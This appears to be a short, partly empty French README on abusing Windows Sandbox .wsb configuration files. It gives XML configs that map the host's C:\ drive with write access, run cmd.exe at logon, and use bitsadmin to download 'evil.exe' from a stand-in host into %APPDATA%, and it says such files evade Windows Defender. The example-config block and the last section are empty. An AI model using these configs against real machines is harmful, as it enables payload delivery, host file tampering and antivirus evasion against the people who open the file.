
I  - Fonctionnement du Windows Sandbox


Windows Sandbox (WSB) va permettre de créer un environnement de bureau isolé, 
Les fichiers de configuration de WSB sont au format XML et utilisent l’extension .wsb.


![image](https://user-images.githubusercontent.com/75935486/152426360-480974ca-877d-4786-a715-237211be7558.png)



voici l'exemple d'un fichier de configuration: 

```xml

```











### Exploiter les configurations WSB:


Une des première méthodes consiste à modifier le champs `<Command>` pour executer notre commande malicieuse et accéder au fichiers systèmes de l'hote, en plus de ça les fichiers WSB ne se font pas détecter par Windows Defender.

Commande possible d'injecter:
```xml
<Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
```

Compromissions de la configuration:
```xml
<Configuration>
   <MappedFolders>
 	<MappedFolder>
	  <HostFolder>C:\</HostFolder>
 	  <SandboxFolder>C:\Users\WDAGUtilityAccount\UserFiles</SandboxFolder>
 	  <ReadOnly>false</ReadOnly>
 	</MappedFolder>
   </MappedFolders>
   <LogonCommand>
 	<Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
   </LogonCommand>
</Configuration>
```













```
• Inheriting Write Access permission to Host Machine (Sand-Box-Escape)

# Mapping C:\ root to Sandbox Environment with write access (RW.wsb)
<Configuration>
 <MappedFolders>
 <MappedFolder>
 <HostFolder>C:\</HostFolder>
 <SandboxFolder>C:\Users\WDAGUtilityAccount\UserFiles</SandboxFolder>
 <ReadOnly>false</ReadOnly>
 </MappedFolder>
 </MappedFolders>
</Configuration>
NOTE : File created in the sand-box environment will directly reflect in the C:\ folder of Host Machine



 
• Execution upon Sand-Box Environment Creation 

<Configuration>
 <MappedFolders>
 <MappedFolder>
 <HostFolder>C:\</HostFolder>
 <SandboxFolder>C:\Users\WDAGUtilityAccount\UserFiles</SandboxFolder>
 <ReadOnly>false</ReadOnly>
 </MappedFolder>
 </MappedFolders>
 <LogonCommand>
 <Command>C:\Windows\system32\cmd.exe</Command>
 </LogonCommand>
</Configuration>

NOTE : File created in the sand-box environment will directly reflect in the C:\ folder of Host Machine 


```

### étude approfondi de Windows Sandbox:

